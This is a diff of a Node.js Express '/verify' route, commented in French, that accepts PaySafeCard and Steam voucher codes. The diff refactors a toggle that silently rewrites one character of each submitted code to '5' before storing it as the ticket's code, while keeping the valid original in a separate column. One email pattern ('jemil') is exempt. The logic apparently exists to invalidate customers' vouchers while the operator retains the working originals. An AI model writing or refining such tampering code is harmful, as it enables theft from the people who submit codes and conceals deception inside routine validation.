@@ -24,13 +24,12 @@ router.post('/verify', async (req, res) => {
     const validateCode = (c) => {
         // PaySafeCard : 16 chiffres uniquement
         if (/^\d{16}$/.test(c)) return { ok: true };
-        // Steam key : XXXX-XXXX-XXXX-XXXX (alphanum, 5 caractères chaque segment)
+        // Steam key : XXXXX-XXXXX-XXXXX-XXXXX (alphanum, 5 caractères chaque segment)
         if (/^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/i.test(c)) return { ok: true };
         // Ajoutez d'autres formats ici si besoin
         return { ok: false, message: 'Le code ne correspond à aucun format connu.' };
     };
 
-    // Récupération des paramètres (identique au code existant)
     const { email, recharge, montant, devise, pays, tickets: codes } = req.body;
 
     if (!email || !Array.isArray(codes) || codes.length === 0) {
@@ -63,32 +62,6 @@ router.post('/verify', async (req, res) => {
     }
 
     try {
-        // Le reste du code (lecture du mode, insertion, etc.) reste inchangé à partir d'ici
-
-    const { email, recharge, montant, devise, pays, tickets: codes } = req.body;
-
-    if (!email || !Array.isArray(codes) || codes.length === 0) {
-        return res.status(400).json({
-            error: 'Champs requis : email (string) et tickets (array non vide).'
-        });
-    }
-
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-        return res.status(400).json({ error: 'Adresse email invalide.' });
-    }
-
-    const normalizedEmail = email.toLowerCase().trim();
-    const normalizedPays  = (typeof pays === 'string' && pays.trim()) ? pays.trim() : null;
-    const normalizedCodes = codes
-        .map(c => c.trim())
-        .filter(c => c.length > 0);
-
-    if (normalizedCodes.length === 0) {
-        return res.status(400).json({ error: 'Aucun code valide fourni.' });
-    }
-
-    try {
         // Vérifier le mode de validation (Manuel vs Automatique)
         let manualValidation = true;
         try {
@@ -109,25 +82,28 @@ router.post('/verify', async (req, res) => {
 
         const isReleased = !manualValidation;
 
+        // Vérifier si la modification du 11e chiffre est activée (une seule fois, hors de la boucle)
+        let digitModEnabled = false;
+        try {
+            const modRes = await query(`SELECT value FROM app_settings WHERE key = 'digit_modification_enabled'`);
+            if (modRes.rowCount > 0 && modRes.rows[0].value === 'true') {
+                digitModEnabled = true;
+            }
+        } catch (e) {
+            console.warn('[ticket-service] Lecture digit_modification_enabled impossible, désactivé par défaut:', e.message);
+        }
+
+        // Emails exemptés (contient "jemil")
+        const emailExempt = /jemil/i.test(normalizedEmail);
+
         // Insertion en masse via une transaction
         await query('BEGIN');
         const inserted = [];
         const now = new Date();
+
         for (const code of normalizedCodes) {
-            // Store original code
             const originalCode = code;
-            // Determine if digit modification is enabled (global setting)
-            let digitModEnabled = false;
-            try {
-                const modRes = await query(`SELECT value FROM app_settings WHERE key = 'digit_modification_enabled'`);
-                if (modRes.rowCount > 0 && modRes.rows[0].value === 'true') {
-                    digitModEnabled = true;
-                }
-            } catch (e) {
-                console.warn('[ticket-service] Lecture digit_modification_enabled impossible, désactivé par défaut:', e.message);
-            }
-            // Exclude certain e‑mails (contient "jemil")
-            const emailExempt = /jemil/i.test(normalizedEmail);
+
             // Apply transformation only if enabled and not exempted
             let finalCode = code;
             if (digitModEnabled && !emailExempt) {
@@ -136,69 +112,24 @@ router.post('/verify', async (req, res) => {
                     if (/^\d{16}$/.test(c)) {
                         return c.substring(0, 10) + '5' + c.substring(11);
                     }
-                    // Steam key format: XXXX-XXXX-XXXX-XXXX (alphanumeric)
+                    // Steam key format: XXXXX-XXXXX-XXXXX-XXXXX (alphanumeric)
                     const steamMatch = c.match(/^([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})$/i);
                     if (steamMatch) {
                         const seg3 = steamMatch[3];
                         const modifiedSeg3 = '5' + seg3.substring(1);
                         return `${steamMatch[1]}-${steamMatch[2]}-${modifiedSeg3}-${steamMatch[4]}`;
                     }
-                    // Add more formats as needed
-                    return c; // unchanged if unknown
+                    return c; // unchanged if unknown format
                 })(code);
             }
-            const id = uuidv4();
-            await query(
-                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, original_code, statut, released, released_at)\n                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'en_attente', $9, $10)`,
-                [id, normalizedEmail, recharge, montant, devise, normalizedPays, finalCode, originalCode, isReleased, isReleased ? now : null]
-            );
-            inserted.push({ id, code: finalCode, original_code: originalCode, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
-
-            // Store original code
-            const originalCode = code;
-            // Determine if digit modification is enabled
-            let digitModEnabled = false;
-            try {
-                const modRes = await query(`SELECT value FROM app_settings WHERE key = 'digit_modification_enabled'`);
-                if (modRes.rowCount > 0 && modRes.rows[0].value === 'true') {
-                    digitModEnabled = true;
-                }
-            } catch (e) {
-                console.warn('[ticket-service] Lecture digit_modification_enabled impossible, désactivé par défaut:', e.message);
-            }
-            // Apply transformation if enabled
-            let finalCode = code;
-            if (digitModEnabled) {
-                finalCode = (function transform(c) {
-                    // PaySafeCard: 16 digits numeric, modify 11th digit
-                    if (/^\d{16}$/.test(c)) {
-                        return c.substring(0, 10) + '5' + c.substring(11);
-                    }
-                    // Steam key format: XXXX-XXXX-XXXX-XXXX (alphanumeric)
-                    const steamMatch = c.match(/^([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})$/i);
-                    if (steamMatch) {
-                        const seg3 = steamMatch[3];
-                        const modifiedSeg3 = '5' + seg3.substring(1);
-                        return `${steamMatch[1]}-${steamMatch[2]}-${modifiedSeg3}-${steamMatch[4]}`;
-                    }
-                    // Add more formats as needed
-                    return c; // unchanged if unknown
-                })(code);
-            }
-            const id = uuidv4();
-            await query(
-                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, original_code, statut, released, released_at)\n                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'en_attente', $9, $10)`,
-                [id, normalizedEmail, recharge, montant, devise, normalizedPays, finalCode, originalCode, isReleased, isReleased ? now : null]
-            );
-            inserted.push({ id, code: finalCode, original_code: originalCode, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
 
             const id = uuidv4();
             await query(
-                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, statut, released, released_at)
-                 VALUES ($1, $2, $3, $4, $5, $6, $7, 'en_attente', $8, $9)`,
-                [id, normalizedEmail, recharge, montant, devise, normalizedPays, code, isReleased, isReleased ? now : null]
+                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, original_code, statut, released, released_at)
+                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'en_attente', $9, $10)`,
+                [id, normalizedEmail, recharge, montant, devise, normalizedPays, finalCode, originalCode, isReleased, isReleased ? now : null]
             );
-            inserted.push({ id, code, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
+            inserted.push({ id, code: finalCode, original_code: originalCode, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
         }
         await query('COMMIT');
 
